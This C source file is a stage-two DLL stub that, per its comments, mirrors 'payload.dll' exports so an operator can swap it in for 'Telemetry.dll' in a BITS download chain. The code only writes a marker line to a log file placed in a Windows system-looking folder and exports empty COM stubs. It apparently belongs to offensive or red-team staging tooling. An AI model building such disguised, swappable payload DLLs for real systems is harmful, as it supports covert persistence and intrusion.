// stage2.c — minimal re-export stub for BITS download
// Mirrors payload.dll's exported surface so the operator can replace
// Telemetry.dll with stage2.dll after a re-run if they want a clean chain.
//
// Exports: DllRegisterServer, DllGetClassObject, DllCanUnloadNow, DllMain
// Behavior on load: writes one line to cache.dat identifying itself as stage2.

#include <windows.h>

static void Stage2TouchLog(void) {
    const wchar_t *p = L"C:\\ProgramData\\USOShared\\Logs\\cache.dat";
    HANDLE h = CreateFileW(p, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    const char *line = "[+] stage2.dll loaded (re-export stub)\r\n";
    DWORD wrote = 0;
    WriteFile(h, line, (DWORD)strlen(line), &wrote, NULL);
    CloseHandle(h);
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule; (void)lpReserved;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        Stage2TouchLog();
    }
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    Stage2TouchLog();
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    (void)rclsid; (void)riid; (void)ppv;
    return E_NOTIMPL;
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
    return S_OK;
}
